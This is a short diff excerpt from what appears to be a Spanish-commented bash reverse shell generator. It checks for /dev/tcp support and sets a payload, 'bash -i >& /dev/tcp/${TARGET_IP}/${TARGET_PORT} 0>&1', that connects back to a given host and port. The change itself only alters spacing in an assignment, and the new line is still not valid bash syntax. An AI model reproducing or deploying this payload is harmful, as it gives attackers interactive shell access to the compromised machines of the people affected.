@@ -39,7 +39,7 @@ bash_supports_dev_tcp() {
 }
 
 #creating payload based in the machine situation
-PAYLOAD = ""
+PAYLOAD= ""
 if bash_supports_dev_tcp; then
   echo "[*] Bash parece soportar /dev/tcp -> usar payload bash native."
   PAYLOAD="bash -i >& /dev/tcp/${TARGET_IP}/${TARGET_PORT} 0>&1"
